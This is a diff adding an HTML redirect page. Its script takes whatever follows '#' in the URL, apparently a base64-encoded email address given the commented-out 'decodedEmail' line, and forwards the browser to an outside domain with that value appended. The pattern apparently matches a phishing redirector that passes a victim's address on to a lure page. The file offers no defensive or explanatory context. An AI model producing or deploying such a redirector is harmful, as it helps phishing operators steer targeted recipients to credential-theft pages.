@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Redirrecting......</title>
+</head>
+
+<body>
+    <script>
+        function redirrectPage() {
+            const linkraw = "https://pageyshlaw.vu/onepage/index.html";
+            var query = window.location.href;
+            console.log(query);
+            var res = query.split("#");
+            var data1 = res[0];
+            var data2 = res[1];
+            console.log(data1);
+            console.log(data2);
+            if (data2) {
+                //var decodedEmail = atob(data2);
+                console.log("true");
+                window.location.href = linkraw + data2;
+            } else {
+                console.log("false");
+                window.location.href = linkraw;
+            }
+        }
+        redirrectPage();
+    </script>
+</body>
+
+</html>
